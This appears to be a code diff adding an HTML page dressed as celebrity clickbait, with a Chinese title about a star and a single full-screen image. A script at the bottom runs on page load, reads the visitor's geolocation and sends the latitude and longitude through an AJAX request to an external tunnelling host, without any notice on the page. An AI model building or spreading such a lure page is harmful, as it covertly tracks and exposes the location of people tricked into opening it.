@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="">
+<script type="text/javascript" src="/websocket/jquery.js"></script>
+<head> 
+    <title>王一博，一位顶流……</title>
+</head>
+<style type="text/css">
+    #divMain{
+        border: red solid 1px;
+        width:100%;
+        height: 100%;
+        padding:0;
+    }
+    #divMain img{
+        border: green solid 1px;
+        width:100%;			/* ... */
+        height:100%;		/* ... */
+        display:block;	/* ... */
+    }
+</style>
+<body>
+<div id="divMain">
+    <img src="/websocket/hello.jpg" alt="">
+</div>
+</body>
+</html>
+
+<script >
+
+    console.log("初始化数据");
+
+    getLocation();
+
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition);
+        } else {
+            console.log("该浏览器不支持获取地理位置。");
+            info("该浏览器不支持获取地理位置。")
+        }
+    }
+
+    function showPosition(position) {
+        var local = "纬度: " + position.coords.latitude +
+            "<br>经度: " + position.coords.longitude;
+        info(local);
+    }
+
+    function info(data) {
+        console.log('执行');
+        $.ajax({
+            url: "https://zero.cn1.utools.club/websocket/view/info?info=" + data,
+            type: "GET",
+            contentType: "application/json;charset=utf-8",
+            dataType: "text",
+            success: function (result) {
+                console.log(result);
+            }
+        })
+    }
+</script>
